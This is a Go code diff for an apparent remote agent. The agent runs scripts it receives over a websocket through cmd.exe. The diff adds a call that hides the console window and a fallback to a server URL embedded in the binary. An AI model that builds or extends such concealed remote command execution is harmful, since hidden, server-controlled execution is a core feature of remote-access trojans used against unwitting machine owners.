@@ -41,14 +41,21 @@ func runMainApplication() {
 }
 
 func resolveServerURL() string {
-	data, err := os.ReadFile(ConfigFileName)
-	if err != nil {
-		slog.Warn("could not read local configuration file, reverting to defaults", "err", err)
-		return DefaultServerURL
+	// A runtime config.txt beside the executable takes precedence (override),
+	// otherwise fall back to the configuration bundled inside the binary.
+	if data, err := os.ReadFile(ConfigFileName); err == nil {
+		if urlStr := strings.TrimSpace(string(data)); urlStr != "" {
+			slog.Info("using server URL from local override configuration file")
+			return urlStr
+		}
+		slog.Warn("local configuration file empty, falling back to bundled config")
+	} else {
+		slog.Debug("no local configuration file present, using bundled configuration", "err", err)
 	}
 
-	urlStr := strings.TrimSpace(string(data))
+	urlStr := strings.TrimSpace(string(embeddedConfig))
 	if urlStr == "" {
+		slog.Warn("bundled configuration empty, reverting to defaults")
 		return DefaultServerURL
 	}
 	return urlStr
@@ -99,6 +106,8 @@ func executeAndReply(ctx context.Context, conn *websocket.Conn, task protocol.Ta
 	default:
 		cmd = exec.CommandContext(execCtx, "cmd.exe", "/c", task.ScriptBlock)
 	}
+
+	applyHiddenWindow(cmd)
 
 	// CombinedOutput safely captures both stdout and stderr into a single slice natively
 	outputBytes, err := cmd.CombinedOutput()
